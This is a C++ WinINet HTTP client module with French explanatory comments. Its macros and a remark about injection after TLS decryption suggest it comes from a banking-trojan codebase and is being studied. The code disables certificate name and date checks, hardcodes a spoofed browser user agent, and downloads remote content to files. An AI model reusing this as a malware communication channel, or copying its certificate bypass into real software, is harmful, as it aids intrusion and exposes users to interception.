#include <windows.h>
#include <wininet.h> //API qui permet à d'accéder à internet avec notamment HTTP, FTP ...
#include "wininet.h"
#include "fs.h"
#include "httptools.h"

//User agent défini en dur
#define DEFAULT_USER_AGENT "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1)"
//Version HTTP prise en conséidération par défaut
#define DEFAULT_HTTP_VERSION "HTTP/1.1"
//Taille du tampon
#define WININET_BUFFER_SIZE 4096


static LPSTR AcceptTypes[] = {"*/*", NULL};

typedef struct
{
  DWORD dwOption;
  DWORD dwValue;
}WININETOPTION;

static WININETOPTION WinInetOptions[] =
{
  //Sets an unsigned long integer value that contains the time-out value, in milliseconds, to use for Internet connection requests.
  {INTERNET_OPTION_CONNECT_TIMEOUT,  1 * 60 * 1000},
  //Sets an unsigned long integer value that contains the time-out value, in milliseconds, to receive a response to a request.
  {INTERNET_OPTION_RECEIVE_TIMEOUT, 1 * 60 * 1000},
  //Sets an unsigned long integer value, in milliseconds, that contains the time-out value to send a request.
  {INTERNET_OPTION_SEND_TIMEOUT,    1 * 60 * 1000}
};

void Wininet::Init(void)
{
}

void Wininet::Uninit(void)
{
}

////////////////////////////////////////////////////////////////////////////////////////////////////

bool Wininet::_CallURL(CALLURLDATA *pcud, MEMDATA *pBuf)
{
  bool r = false;
  HttpTools::URLDATA ud;

  if(HttpTools::_parseUrl(pcud->pstrURL, &ud))
  {
    DWORD dwRequestFlags = pcud->SendRequest_dwFlags;
    if(ud.scheme == HttpTools::UDS_HTTPS)dwRequestFlags |= WISRF_IS_HTTPS; // serveur qui utilise https (TLS). Donc l'injection à lieu après le déchiffrement
    else dwRequestFlags &= ~(WISRF_IS_HTTPS); // serveur qui utilise du http standard

    for(BYTE bi = 0; bi < pcud->bTryCount; bi++) //parcours de tous les octect 
    {
     
      if(bi > 0)
      {
        if(pcud->hStopEvent != NULL)
        {
          if(CWA(kernel32, WaitForSingleObject)(pcud->hStopEvent, pcud->dwRetryDelay) != WAIT_TIMEOUT)goto END;
        }
        else CWA(kernel32, Sleep)(pcud->dwRetryDelay);
      }

      DWORD dwConnectFlags = pcud->Connect_dwFlags;
      BYTE pp_m = 1;
      if(pcud->bAutoProxy) //si il y a un auto proxy
      {
        dwConnectFlags |= WICF_USE_IE_PROXY;
        pp_m++;
      }

      for(BYTE pp = 0; pp < pp_m; pp++)
      {
        if(pp == 1)dwConnectFlags &= ~(WICF_USE_IE_PROXY);

        //HINTERNET sont des HANDLE utilisés par WinINET. Initialisation de la connexion
        HINTERNET hConnect = _Connect(pcud->pstrUserAgent, ud.host, ud.port, dwConnectFlags);
        if(hConnect) // si la connexion a été correctement initialisée
        {

	  //On envoit la requête HTTP (GET ou POST) 	
          HINTERNET hRequest = _SendRequest(hConnect, ud.uri, NULL, pcud->SendRequest_pPostData, pcud->SendRequest_dwPostDataSize, dwRequestFlags);
          if(hRequest)
          {
            if(pcud->DownloadData_pstrFileName)r = _DownloadDataToFile(hRequest, pcud->DownloadData_pstrFileName, pcud->DownloadData_dwSizeLimit, pcud->hStopEvent);
            else r = _DownloadData(hRequest, pBuf, pcud->DownloadData_dwSizeLimit, pcud->hStopEvent);
            CWA(wininet, InternetCloseHandle)(hRequest);
          }

          _CloseConnection(hConnect);
          if(r)goto END;
        }
      }
    }
END:
    HttpTools::_freeUrlData(&ud);
  }
  return r;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

//OUVRE UNE CONNEXION
HINTERNET Wininet::_Connect(LPSTR pstrUserAgent, LPSTR pstrHost, WORD wPort, DWORD dwFlags) //LPSTR est un pointeur sur un string finissant par NULL
{
  //Initialise l'utilisation d'une application des fonctions WinINet. Si il y a un proxy on transmet les demandes au proxy grâce à INTERNET_OPEN_TYPE_DIRECT.
  HINTERNET hInet = CWA(wininet, InternetOpenA)(pstrUserAgent ? pstrUserAgent : DEFAULT_USER_AGENT,
                                                dwFlags & WICF_USE_IE_PROXY ? INTERNET_OPEN_TYPE_PRECONFIG : INTERNET_OPEN_TYPE_DIRECT,
                                                NULL, NULL, 0);
  if(hInet == NULL)return NULL; //erreur

  //on met les informations (dwOPtion) dans le HANDLE hInet
  for(DWORD i = 0; i < sizeof(WinInetOptions) / sizeof(WININETOPTION); i++)
	  CWA(wininet, InternetSetOptionA)(hInet, WinInetOptions[i].dwOption, (void *)&WinInetOptions[i].dwValue, sizeof(DWORD));

  //Initialise connexion avec du HTTP se basant sur les infos contenues dans le HANDE hInet
  HINTERNET hConnect = CWA(wininet, InternetConnectA)(hInet, pstrHost, wPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, NULL);
  if(hConnect == NULL)
  {
    CWA(wininet, InternetCloseHandle)(hInet);
    return NULL;
  }

  return hConnect; //retourne le HANDLE sur la connexion 
}

////////////////////////////////////////////////////////////////////////////////////////////////////

//ENVOIT UNE REQUETE
HINTERNET Wininet::_SendRequest(HINTERNET hConnect, LPSTR pstrURI, LPSTR pstrReferer, void *pPostData, DWORD dwPostDataSize, DWORD dwFlags)
{
  DWORD dwReqFlags = INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
                     INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_AUTH | 
                     INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD;

  if(dwFlags & WISRF_KEEP_CONNECTION)dwReqFlags |= INTERNET_FLAG_KEEP_CONNECTION;
  if(dwFlags & WISRF_IS_HTTPS)dwReqFlags |= INTERNET_FLAG_SECURE;

# if defined WDEBUG1
  WDEBUG1(WDDT_INFO, "pstrURI=%S", pstrURI);  
# endif
  
  //Créer un HANDLE d'une requête HTTP GET ou POST en fonction de dwFlags, vers la session HTTP représenté par hConnect
  HINTERNET hReq = CWA(wininet, HttpOpenRequestA)(hConnect, dwFlags & WISRF_METHOD_POST ? "POST" : "GET", pstrURI, DEFAULT_HTTP_VERSION, pstrReferer, (LPCSTR *)AcceptTypes, dwReqFlags, NULL);

  if(hReq != NULL)
  {
    LPSTR headers;
    DWORD headersSize;
    
    if(dwFlags & WISRF_KEEP_CONNECTION)
    {
      headers     = NULL;
      headersSize = 0;
    }
    else
    {
      headers     = "Connection: close\r\n";
      headersSize = 19;
    }
    
    //Envoit de la requête
    if(CWA(wininet, HttpSendRequestA)(hReq, headers, headersSize, pPostData, dwPostDataSize))
    {
      DWORD dwStatus = 0, dwSize = sizeof(DWORD);
	 
      //Récupère les informations du header associés à la requète HTTP. True => succès
      if(CWA(wininet, HttpQueryInfoA)(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwStatus, &dwSize, NULL) && dwStatus == HTTP_STATUS_OK)return hReq;
    }
    CWA(wininet, InternetCloseHandle)(hReq);
  }
  return NULL; //échech de la requête
}

////////////////////////////////////////////////////////////////////////////////////////////////////

void Wininet::_CloseConnection(HINTERNET hConnect)
{
  HINTERNET hInet = NULL;
  DWORD dwSize = sizeof(HINTERNET);
  BOOL r = CWA(wininet, InternetQueryOptionA)(hConnect, INTERNET_OPTION_PARENT_HANDLE, (void *)&hInet, &dwSize);
  CWA(wininet, InternetCloseHandle)(hConnect);
  if(r && hInet && dwSize == sizeof(HINTERNET))CWA(wininet, InternetCloseHandle)(hInet);
  #if(BO_DEBUG > 0 && defined(WDEBUG1))
  else WDEBUG0(WDDT_ERROR, "Opps! Parent no founded for hConnection!");
  #endif
}
